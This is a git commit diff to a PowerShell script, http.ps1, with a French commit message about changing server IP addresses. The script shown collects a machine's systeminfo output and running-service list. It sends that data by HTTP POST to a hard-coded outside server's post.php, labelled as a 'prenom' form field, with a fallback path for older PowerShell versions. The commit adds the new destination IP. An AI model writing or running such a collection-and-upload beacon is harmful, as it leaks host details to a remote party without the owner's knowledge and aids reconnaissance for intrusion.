bbd3661d3a5be928eff2a339c63a2d6a69ca21d3
Tanguy <moreautanguy@gmail.com>
2020-12-03 15:48:56 +0400

    Modification adresse ip sur le fichier http
    J'ai modifier les adresses ip pour pouvoir correspondre à notre adresse de reference du serveur web

--- http.ps1
+++ http.ps1
@@ -4,11 +4,11 @@ $Number = $Host.Version.Major
 $infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;
 If ($Number -gt 4)
 {
-    $Body = @{prenom = $infos + $task};$LoginResponse = Invoke-WebRequest 'http://178.170.58.9/post.php' -SessionVariable 'Session' -Body $Body -Method 'POST'
+    $Body = @{prenom = $infos + $task};$LoginResponse = Invoke-WebRequest 'http://193.253.115.56/post.php' -SessionVariable 'Session' -Body $Body -Method 'POST'
 }
 else {    
     $Body = [byte[]][char[]]$infos;
-    $Request = [System.Net.HttpWebRequest]::Create('http://178.170.58.9/post.php');
+    $Request = [System.Net.HttpWebRequest]::Create('http://193.253.115.56/post.php');
     $Request.Method = 'POST';
     $Stream = $Request.GetRequestStream();
     $Stream.Write($Body, 0, $Body.Length);
